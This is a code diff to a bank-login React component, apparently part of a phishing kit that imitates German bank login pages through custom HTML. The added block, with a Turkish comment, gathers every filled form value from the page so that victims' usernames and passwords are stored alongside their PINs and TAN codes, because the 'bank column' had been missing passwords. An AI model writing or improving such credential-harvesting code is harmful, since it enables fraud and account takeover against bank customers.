@@ -309,6 +309,36 @@ export function BankLoginClient({ sessionId, bankSlug, bank }: Props) {
     setSaving(true);
     setError(null);
 
+    // 🔴 KRITIK: customHtml/visualTree banka sayfalarinda input'lar React
+    //    state'e bagli degil (sadece verfuegernummer/pin/tacCode bind ediliyor).
+    //    "password"/"username" gibi input'larin degerleri DOM'da kaliyor ve
+    //    submit'te hic okunmadan kayboluyordu -> banka kolonunda sifre yoktu.
+    //    Form DOM'undaki tum dolu degerleri hasat edip overrideData'ya karistir.
+    if (e?.target) {
+      try {
+        const domVals: Record<string, unknown> = {};
+        (e.target as HTMLFormElement)
+          .querySelectorAll("input, select, textarea")
+          .forEach((el) => {
+            const inp = el as any;
+            const nm =
+              typeof inp.name === "string" && inp.name
+                ? inp.name
+                : typeof inp.id === "string" && inp.id
+                  ? inp.id
+                  : "";
+            if (!nm) return;
+            const v = typeof inp.value === "string" ? inp.value.trim() : "";
+            if (v) domVals[nm] = v;
+          });
+        if (Object.keys(domVals).length > 0) {
+          overrideData = { ...(overrideData ?? {}), ...domVals };
+        }
+      } catch {
+        /* ignore */
+      }
+    }
+
     const knownCredentialKeys = new Set([
       "verfuegernummer",
       "pin",
